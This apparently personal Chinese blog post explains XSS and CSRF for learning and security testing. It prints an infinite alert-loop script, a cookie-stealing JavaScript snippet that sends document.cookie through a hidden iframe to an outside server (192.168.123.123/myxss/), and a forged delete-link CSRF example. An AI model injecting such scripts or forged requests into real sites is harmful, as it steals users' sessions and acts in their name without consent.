>参考自[《前端——影子杀手篇》](https://segmentfault.com/a/1190000011486364)、[《用大白话谈谈XSS与CSRF》](https://segmentfault.com/a/1190000007059639)

>关于Web的各种攻击方式，之前自己了解的很少，现在通过各种途径来广泛了解一下。因为后续自己要开发一个Web项目，从需求、设计、开发、功能测试、性能测试、压力测试、性能调优、安全测试等全方面都要自己做，所以各方面都会在这个过程中慢慢补

## 简介

XSS和CSRF这两个关键词也是老生常谈了，但还总是容易让人忘记和搞混

XSS与CSRF这两个关键词时常被拉出来一起比较（尤其是面试），我在这里也在写一篇扫盲文，也帮自己整理一下知识脉络

这篇文章会用尽量“人话”的语言解释这二个关键词，让同学们对跨域，安全有更深一层次的了解

国际惯例，先上一下维基百科：

XSS：跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。**这类攻击通常包含了HTML以及客户端脚本语言**

CSRF：跨站请求伪造（英文：Cross-site request forgery），也被成为one-click attack或session riding，通常缩写为CSRF或XSRF，是一种挟制用户在当前已登录的Web应用程序上**执行非本意的操作的攻击方式**

## 开始白话

维基的解释依旧高深莫测，接下来用“人话”给大家解释一下

XSS：通过客户端脚本语言（最常见如JavaScript）在一个论坛发帖中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫做XSS

CSRF：又称为XSRF，冒充用户发起请求（在用户不知情的情况下），完成一些违背用户意愿的请求（比如恶意发帖、删帖、改密码、发邮件等）

>很多同学会搞不明白XSS与CSRF的区别，虽然这两个关键词时常抱团出现，但它们两个是不同维度的东西（或者说它们的目的是不一样的）

>XSS更偏向于方法论，CSRF更偏向于一种形式，只是要伪造用户发起的请求，都可称为CSRF攻击

通常来说CSRF是由XSS实现的，所以CSRF时常也被成为XSRF[用XSS的方式实现伪造请求]（但实现的方式绝对不止一种，还可以直接通过命令行模式，即命令行敲命令来发起请求）直接伪造请求[只要通过合法验证即可]）

XSS更偏向于代码实现（即写一段拥有跨站请求功能的JavaScript脚本注入到一条帖子中，然后有用户访问这个帖子，这就算是中了XSS攻击了），CSRF更偏向于一个攻击结果，只要发起了冒牌请求那么就算是CSRF了

简单来说，条条大路（XSS路、命令行路）通罗马（CSRF马）

## XSS代码示例

场景：在一条帖子中写下如下代码，发了出去，然后陆陆续续很多无知的用户访问到这个帖子，然后用户接下来的所有操作都被这段代码掌控了

如下

```
while(true){
    alert('你关不掉我');
}
```

这个就是最原始的脚本注入了。用户进来就麻烦了，一直弹窗一直弹窗

那么XSS（跨站脚本）就是照葫芦画瓢了，用JavaScript写一个请求跨站的脚本就是XSS，如下

```
//用<script type="text/javascript"></script>包起来放在评论中
(function(window, document){
    //构造泄漏信息用的URL
    var cookies = document.cookie;
    var xssURIBase = "http://192.168.123.123/myxss/";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    //建立隐藏iframe用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    dideFrame.src = xssURI;
    //开工
    document.body.appendChild(hideFrame);
})(window, document);
```

这段代码携带者cookie信息传输给了`http://192.168.123.123/myxss/...`这段服务器，然后服务器的代码就可以接收到了用户的隐私消息，继而继续做其他的业务处理（myxss/index.php中写一些可怕的代码，如吧用户信息存进自己的数据库）

>有没有感觉到背后一凉

看到这里感觉到危险了吧（想想初学程序时我们的站点完全没有这个意识，活生生的是在裸奔），既然这段代码注入能携带着用户信息到收集服务器，那么再研究研究，它自然能发邮件、发帖、一系列业务逻辑

这里说一下：上面的代码仅仅是XSS，并没有发生CSRF，因为`192.168.123.123/myxss/index.php`仅仅是把用户信息存起来了而已，它并没有“伪造”用户发起一些请求，所以它只算是XSS攻击而不算是CSRF攻击，如果`192.168.123.123/myxss/index.php`写的代码是将当前用户的昵称修改为“我是大笨蛋”，那么就算是CSRF攻击了，因为这段代码伪造出用户发出了请求（但用户却不自知）

## CSRF攻击实例

下面介绍一个最最简单的CSRF攻击（并没有用到XSS）

一个论坛，经过我的多次抓包分析（注重分析请求返回头、请求返回体）了解到这个论坛的删帖操作是触发`csdnblog.com/bbs/delete_article.php?id="X"`，那么我只需要在论坛中发一贴，包含一链接：`csdnblog.com/bbs/delete_article.php?id="X"`，只要有用户点击了这个链接，那么ID为X的这篇文章就被删除了，而且是用户完全不知情的情况下

此处我可没有写CSS脚本，纯粹只是发一个URL地址而已，既然删除操作可以伪造，那么只要我细细分析，其他操作：发帖、改名字、发私信，只要是这个论坛具有的功能，都可以进行伪造

## 反思

这里知识对XSS、CSRF做了简单的介绍，后续还是重点弄清楚XSS、CSRF的原理，而不是死学所有方法，只有原理弄清楚了，才知道可能有哪些方法可以实现攻击（帮助自己编写安全测试用例），只有清楚了原理才能在原理层面做防护来应对所有攻击方法（而不是针对每一种方法新增一种防护方法）
